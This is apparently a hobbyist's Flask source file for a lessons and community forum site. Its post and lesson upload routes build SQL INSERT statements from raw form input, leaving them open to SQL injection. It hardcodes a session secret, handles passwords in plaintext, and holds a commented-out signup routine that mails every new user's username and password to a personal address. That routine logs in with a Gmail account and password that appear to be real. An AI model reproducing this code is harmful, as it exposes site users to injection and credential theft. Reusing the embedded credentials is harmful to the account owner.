from flask import Flask, redirect, url_for, render_template, request, session
import sqlite3, os, smtplib, ssl

app = Flask(__name__)
app.secret_key = "K1YS1R"

@app.route("/lessons")
def lessons():
    con = sqlite3.connect("lessons.db")
    cur = con.cursor()
    cur.execute("SELECT lessonname, video FROM lessons")
    rows = cur.fetchall()
    cur.execute("SELECT lessonname, Contents FROM textlessons")
    rowst = cur.fetchall()
    print(rowst)
    return render_template("lessons.html", lessons=rows, textlessons=rowst)

@app.route("/community", methods=["GET", "POST"])
def community():
    con = sqlite3.connect("community.db")
    cur = con.cursor()

    cur.execute("SELECT name, contents FROM posts")
    rows = cur.fetchall()

    print(rows)
    return render_template("community.html", posts=rows)

@app.route("/communityupload", methods=["GET", "POST"])
def communityupload():
    if request.method == "POST":
        con = sqlite3.connect("community.db")
        cur = con.cursor()
        title = request.form["title"]
        content = request.form["content"]
        date = "0/0/0000"

        cur.execute(f"INSERT INTO posts(name, contents, date, comments) values('{title}', '{content}', '{date}', '{[]}')")
        con.commit()

        return redirect(url_for("community"))
    return render_template("communityupload.html")

@app.route("/lessonupload", methods=["GET", "POST"])
def lessonupload():
    if request.method == "POST":
        con = sqlite3.connect("lessons.db")
        cur = con.cursor()
        name = request.form["name"]
        video = request.form["video"]
        type = request.form["type"]
        content = request.form["content"]

        if type == "v":
            cur.execute(f"INSERT INTO Lessons(lessonname, video) values('{name}', '{video}')")
            con.commit()
        elif type == "t":
            cur.execute(f"INSERT INTO textlessons(LessonName, Contents) values('{name}', '{content}')")
            con.commit()

        return redirect(url_for("lessons"))
    return render_template("lessonupload.html")

@app.route("/", methods=["GET", "POST"])
def home():
    return render_template("home.html")

@app.route("/signup", methods=["GET", "POST"])
def signup():
    # if request.method == "POST":
    #     con = sqlite3.connect("accounts.db")
    #     cur = con.cursor()
    #     username = request.form["username"]
    #     password = request.form["password"]

    #     #cur.execute(f"INSERT INTO accounts(username, password) values('{username}', '{password}')")

    #     message = f"""{username} is trying to sign in!\nDetails:\nusername: {username}\npassword: {password}"""

    #     with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ssl.create_default_context()) as server:
    #         server.login("issuseless4@gmail.com", "Habisinev45")
    #         server.sendmail("issuseless4@gmail.com", "abeebissa@yahoo.com", message)

        #con.commit()

        # return render_template("login.html", username=username, password=password)
    return render_template("signup.html")

@app.route("/signout")
def signout():
    session["uname"] = None
    return redirect(url_for("home"))

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        con = sqlite3.connect("accounts.db")
        cur = con.cursor()
        exists = False

        username = request.form["username"]
        password = request.form["password"]

        cur.execute(f"SELECT * from accounts")
        c = cur.fetchall()

        #0: id 1: name 2: password
        for account in c:
            if account[1] == username and account[2] == password:
                exists = True
        
        if exists:
            session["uname"] = username

        return render_template("home.html", username=username, password=password)
    return render_template("login.html")

@app.route("/user")
def user(username, password):
    return render_template("user.html")

@app.route("/specialform")
def specialform():
    return render_template("specialform.html")

app.run(host="0.0.0.0")
